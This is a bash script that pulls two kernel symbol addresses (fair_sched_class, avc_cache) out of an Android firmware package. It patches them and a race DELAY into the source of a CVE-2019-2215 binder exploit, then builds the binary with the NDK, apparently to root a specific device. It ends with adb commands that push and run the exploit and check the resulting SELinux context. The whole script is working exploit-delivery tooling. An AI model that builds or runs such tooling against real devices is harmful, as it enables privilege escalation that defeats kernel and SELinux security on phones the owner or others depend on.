#!/bin/bash
# One command: firmware package -> the two constants -> patched exploit -> built
# binary, ready to push.
#
# Usage: apply_constants_and_build.sh <firmware.rar|zip|app> [workdir]
#
# Only the two #define values (plus DELAY) are touched. That matters: measured on
# this device, the exploit wins its race only when the source is unchanged or when
# nothing but constant immediates move. Any structural change (a swapped call, an
# added printf, an argv sweep) loses, even at an identical binary size.
set -u
FWH="${1:?usage: apply_constants_and_build.sh <firmware> [workdir]}"
W="${2:-/tmp/apply_const}"
HERE="/home/placeless/dev/p20-root"
EXPL="/home/placeless/dev/p20lite-cve"
NDK=$(ls -d ~/Android/Sdk/ndk/*/ 2>/dev/null | head -1)
mkdir -p "$W"

echo "############ 1. constants from the firmware"
bash "$HERE/fw_to_constants.sh" "$FWH" "$W/fw" 2>&1 | tee "$W/fw.log" | tail -25
NEW_F=$(awk '/fair_sched_class/ && /ffffff/ {print $2; exit}' "$W/fw.log")
NEW_A=$(awk '/avc_cache/ && /ffffff/ {print $2; exit}' "$W/fw.log")
[ -n "$NEW_F" ] && [ -n "$NEW_A" ] || { echo "!!! could not read the constants"; exit 1; }
echo
echo "  fair_sched_class = 0x$NEW_F"
echo "  avc_cache        = 0x$NEW_A"

echo
echo "############ 2. patch only the constants (and DELAY)"
cd "$EXPL"
git checkout -- exploit/ 2>/dev/null
python3 - "$NEW_F" "$NEW_A" <<'PY'
import re, sys
f, a = sys.argv[1], sys.argv[2]
h = "/home/placeless/dev/p20lite-cve/exploit/include/kernel_specific.h"
s = open(h).read()
s2 = re.sub(r"#define FAIR_SCHED_CLASS\s+0x[0-9a-fA-F]+[uU][lL]",
            f"#define FAIR_SCHED_CLASS 0x{f}UL", s)
s2 = re.sub(r"#define AVC_CACHE\s+0x[0-9a-fA-F]+[uU][lL]",
            f"#define AVC_CACHE 0x{a}ul", s2)
assert s2 != s, "no constant replaced"
open(h, "w").write(s2)
d = "/home/placeless/dev/p20lite-cve/exploit/include/cve_2019_2215.h"
t = open(d).read()
t2 = re.sub(r"#define DELAY \d+u", "#define DELAY 25u", t)
open(d, "w").write(t2)
print("patched kernel_specific.h and DELAY")
PY
echo "  --- resulting defines:"
grep -nE "#define (FAIR_SCHED_CLASS|AVC_CACHE)" exploit/include/kernel_specific.h
grep -nE "^#define DELAY" exploit/include/cve_2019_2215.h
echo "  --- diff (should be constants only):"
git diff --stat
git diff | grep -E "^[+-]#define" || true

echo
echo "############ 3. build"
"${NDK}ndk-build" -j4 NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk \
    APP_PLATFORM=android-28 APP_ABI=arm64-v8a 2>&1 | tail -2
BIN="$EXPL/libs/arm64-v8a/cve-2019-2215"
ls -la "$BIN"
md5sum "$BIN"

echo
echo "### ready. push and run with:"
echo "###   adb push $BIN /data/local/tmp/cve-2019-2215"
echo "###   adb shell chmod 755 /data/local/tmp/cve-2019-2215"
echo "###   adb shell /data/local/tmp/cve-2019-2215   (then check /proc/self/attr/current)"
